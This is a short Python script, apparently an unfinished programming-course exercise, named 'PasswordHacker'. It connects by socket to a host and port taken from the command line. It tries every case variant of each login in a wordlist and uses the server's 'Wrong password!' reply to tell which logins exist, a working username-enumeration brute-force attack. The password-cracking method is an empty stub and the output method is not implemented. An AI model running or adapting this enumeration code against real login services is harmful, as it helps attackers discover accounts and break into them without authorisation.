import socket
import sys
import json
from itertools import product


class PasswordHacker:
    def __init__(self, hostname: str, port: int):
        self.hostname: str = hostname
        self.port: int = port
        self.address: tuple[str, int] = (self.hostname, self.port)
        self.login_file: str = 'logins.txt'
        self.login: str = ''
        self.password: str = ''

    def start(self):
        self.find_login()
        self.find_password()
        self.print_output()

    def find_login(self):
        with socket.socket() as my_socket, open(self.login_file) as file:
            password = '1'
            my_socket.connect(self.address)
            for line in file:
                line = line.strip()
                for login in map(lambda x: ''.join(x), product(*([letter.lower(), letter.upper()] for letter in line))):
                    my_socket.send(json.dumps({'login': login, 'password': password}).encode())
                    response = json.loads(my_socket.recv(1024).decode())
                    if response['result'] == 'Wrong password!':
                        self.login = login
                        return

    def find_password(self):
        pass

    def print_output(self):
        raise NotImplementedError


def main() -> None:
    assert len(sys.argv) == 3
    hacker = PasswordHacker(hostname=sys.argv[1], port=int(sys.argv[2]))
    hacker.start()


if __name__ == '__main__':
    main()
